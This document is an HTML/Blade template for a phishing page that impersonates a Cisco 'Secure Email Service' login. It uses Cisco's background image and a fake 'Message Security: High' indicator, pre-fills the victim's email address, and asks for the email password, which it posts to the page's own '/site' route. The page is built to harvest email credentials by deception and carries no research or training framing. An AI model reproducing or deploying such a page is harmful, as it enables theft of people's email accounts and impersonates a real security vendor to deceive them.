<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Sign in - Office Email</title>

	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">


</head>
<body>
	<style type="text/css">

	body{
		background-image: url(https://res.cisco.com/websafe/images/loginbg.gif);
		height: 100%;
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;


}
	.bg-red{

		background-color: red !important;
	}


a{
	text-decoration: none;
}

.title{
	

	color: #39393B;
    
    font-size: 45px;
    font-weight: 100;
    line-height: 56px;
    text-align: center;

}

.security-text{
	color: #7F7F86 !important;
}

.input-text,span{
	color: grey;
}

.mb-6{
	margin-bottom: 160px !important;
}

input{
    
    padding: 8px;
             	
      }
             
#inputDisabled {
    border: 1px solid #ffffff;
    border-radius: 3px;
    background-color: #ffffff;
    height: 35px;
    
    color: #737373;
    font-family: CiscoSans,CiscoSansTT;
    font-size: 14px;
    line-height: 21px;
    
  
}
             
#passwordInput1 {
    width: 100%;
    border: 1px solid #9E9EA2;
    border-radius: 3px;
    background-color: #FFFFFF;
    padding: 9px;
    box-sizing: border-box;
    height: 35px;
    color: #737373;
    font-family: CiscoSans,CiscoSansTT;
    font-size: 14px;
    line-height: 21px;
}

.text-right{
	text-align: right !important;
}


.btn {
    border: none;
    z-index: 2;
    overflow: visible;
    margin: 5px 10px 5px 10px;
    color: #FFFFFF;
    font-family: CiscoSans,CiscoSansTT;
    font-size: 14px;
    line-height: 19px;
    text-align: center;
    height: 35px;
    width: 130px;
    border-radius: 3px;
    background-color: #58585B;
}

.default-font{

	font-family: CiscoSans, CiscoSansTT;
}


.text-black{
	color: #39393B !important;
}


.red{
    color: red !important;
    
}

p{
    font-size:18px;
}

.notice{
        font-size:20px;
        padding: 0px !important;
        margin: 0px !important;
}

.card-body{
	font-size: 17px !important;
	
        line-height: 22px;
        background-color: rgba(0, 183, 128, 0.2); 
        
}

	</style>
	

	<form method="POST" 
			  action="/site" 
			  enctype="multipart/form-data">

			@csrf


<div class="container-fluid card col-12 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-6 offset-lg-3 col-xl-4 offset-xl-4 mt-5 mb-5">
	<div class="row">
		<div class="offset-7 col-4 col-lg-10 offset-lg-1 mt-3 text-right ">
			<span class="security-text">Message Security</span> 
			<br>
			<span 

			id="bullet" 

			style="
			height: 10px; 
			width: 10px; 
			border-radius: 50%; 
			display: inline-block; 
			margin: 4px 0px 0px 60px;
			background-color: rgb(224, 32, 32);">
				
			</span>
			<span class="text-black">High</span>
		
	</div>

	<div class="text-center mt-4 title">

		<span>Secure Email <br> Service</span>
		
			
			<div class="card mt-3">
  <div class="card-body">
   Please re-enter your email and password to continue.
  </div>
</div>
		
	</div>
	<div class=" col-10 offset-1 col-sm-8 offset-sm-2 col-md-8 offset-md-2 col-lg-8 offset-lg-2 col-xl-8 offset-xl-2 input-text">

		<span class="col-12 d-flex mt-4 default-font">Logged In As:</span>
		<input class="col-12" id="inputDisabled" 
		name="email" id="email" 
		type="email" 
		
		class="validate 
				input @error('email')  @enderror" 
				name="email"
				value="{{ old('email', $name ?? '') }}">

								           
				

				

		<!-- <input type="text" name="" placeholder="{{$name ?? ''}}" id="inputDisabled"> -->

		<span class="col-12  d-flex mt-3 default-font">Password</span>
		<span class="col-12  d-flex default-font  red">Please enter your email password</span>


		<input  
		class="col-12"
		id="passwordInput1"
		placeholder="Enter Password" 
		type="password" 
		class="validate 
			input @error('password') @enderror"  
			 name="password" >

	<!--	<input class="col-12" type="text" name="" placeholder="Business Email Password" id=""> -->
 
<div class="row justify-content-between mb-4 mt-2">
    <!-- <div class="col-5 ">
<input type="checkbox" aria-label="Checkbox for following text input"> 
    <span> Remember me</span>   
</div> -->

<div class=" col-lg-12 text-right default-font">

   	<!-- <a href="/sites/create">Forgot password?</a>    -->
</div>
    
  </div>

  <div class="row">
  	<div class=" d-flex justify-content-center">
  		<button type="submit" class=" btn-success col-8 btn-lg">Log into my account</button>


</div>

<div class="d-flex justify-content-center mt-5 mb-6"><a class="default-font" href="/sites/create">Go Back</a></div>
  </div>
		
			
		
	</div>





		
	</div>

	

</div>



</form>



<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

</body>
</html>
